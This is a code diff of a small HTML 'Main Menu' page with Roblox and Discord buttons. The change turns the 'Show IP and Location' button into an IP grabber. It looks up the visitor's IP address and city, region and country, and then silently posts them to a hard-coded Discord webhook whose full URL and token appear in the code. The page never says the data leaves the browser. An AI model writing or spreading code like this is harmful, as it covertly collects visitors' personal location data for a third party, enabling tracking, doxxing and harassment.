@@ -32,35 +32,37 @@
   </head>
   <body>
     <h1>Main Menu</h1>
-    <div class="button" onclick="getLocation()">Show IP Location</div>
+    <div class="button" onclick="showLocation()">Show IP and Location</div>
     <div class="button" onclick="window.location.href='https://www.roblox.com/'">Open Roblox.com</div>
     <div class="button" onclick="sendToDiscord()">Send to Discord</div>
 
     <script>
-      function getLocation() {
+      function showLocation() {
         fetch('https://ipapi.co/json/')
           .then(response => response.json())
-          .then(data => alert(`Your location is: ${data.city}, ${data.region}, ${data.country_name}`))
+          .then(data => {
+            let ipAddress = data.ip;
+            let location = `${data.city}, ${data.region}, ${data.country_name}`;
+            alert(`Your IP address is: ${ipAddress}\nYour location is: ${location}`);
+            sendToDiscord(ipAddress, location);
+          })
           .catch(error => console.log(error));
       }
 
-      function sendToDiscord() {
-        let message = prompt("Enter a message to send to Discord:");
-        if (message) {
-          let webhookUrl = "https://discord.com/api/webhooks/1116345621717209148/L29-g8YYkCIok8DobwUmORRAxrGdfSnx5pbY9fvUTwixgHQoJgLaCiZib5br1w4bSMNZ";
-          let payload = {
-            "content": message
-          };
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          })
-          .then(response => console.log(response))
-          .catch(error => console.log(error));
-        }
+      function sendToDiscord(ipAddress, location) {
+        let webhookUrl = "https://discord.com/api/webhooks/1116345621717209148/L29-g8YYkCIok8DobwUmORRAxrGdfSnx5pbY9fvUTwixgHQoJgLaCiZib5br1w4bSMNZ";
+        let payload = {
+          "content": `IP address: ${ipAddress}\nLocation: ${location}`
+        };
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => console.log(response))
+        .catch(error => console.log(error));
       }
     </script>
   </body>
